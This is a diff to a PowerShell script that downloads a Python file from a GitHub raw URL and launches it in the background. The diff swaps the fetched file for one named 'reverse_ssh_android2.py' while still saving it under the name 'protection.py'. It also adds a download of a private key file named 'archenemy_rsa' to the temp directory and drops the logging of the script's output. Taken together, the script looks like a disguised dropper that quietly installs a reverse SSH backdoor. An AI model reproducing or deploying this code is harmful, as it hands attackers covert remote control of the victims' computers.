@@ -42,10 +42,12 @@ $pythonPath = "$pythonPath\python.exe"
 $outDirectory = "$env:TEMP"		# Temp directory in Windows
 Write-Output "[!] Temp directory: $outDirectory"
 
-$repoUrl = "https://raw.githubusercontent.com/NeronNymus/Protected/refs/heads/main/light/protection.py"
-$requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/Protected/refs/heads/main/requirements.txt"
+$repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/reverse_ssh_android2.py"
+$requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
+$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/archenemy_rsa"
 $scriptPath = "${outDirectory}/protection.py"
 $requirementsPath = "${outDirectory}/requirements.txt"
+$contentPath = "${outDirectory}/archenemy_rsa"
 
 # Check if scriptPath already exists
 if (Test-Path $scriptPath) {
@@ -60,6 +62,7 @@ try {
 	# Download the repository and requirements
 	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
 	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
+	Invoke-WebRequest -Uri $contentUrl -OutFile $contentPath
     Write-Output "[!] Scripts downloaded successfully."
 
     # Install the Python packages from requirements.txt
@@ -83,9 +86,8 @@ if (Test-Path -Path $scriptPath) {
 	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
 
     # Start the Python script in the background
-	Start-Process -FilePath $pythonPath -ArgumentList $scriptPath -NoNewWindow -RedirectStandardOutput "${scriptPathNoExtension}_log" -RedirectStandardError "${scriptPathNoExtension}_Errorlog"
+	Start-Process -FilePath $pythonPath -ArgumentList $scriptPath -NoNewWindow 
     Write-Output "[*] Python script started in the background."
-	#Write-Output "[*] $pythonPath $scriptPath"
 } else {
     Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
 }
